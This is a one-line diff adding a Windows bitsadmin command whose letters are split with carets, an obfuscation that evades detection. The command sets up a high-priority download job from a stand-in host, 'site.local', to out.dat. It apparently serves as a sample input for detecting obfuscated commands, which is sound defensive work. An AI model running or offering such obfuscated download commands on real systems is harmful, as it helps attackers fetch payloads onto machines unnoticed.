@@ -1,0 +1,1 @@
+b^^^^i^^^^t^^^^s^^^^a^^^^d^^^^m^^^^i^^^^n /t^r^a^n^s^f^e^r myJob /d^o^w^n^l^o^a^d /p^r^i^o^r^i^t^y h^i^g^h "https://site.local/f" out.dat
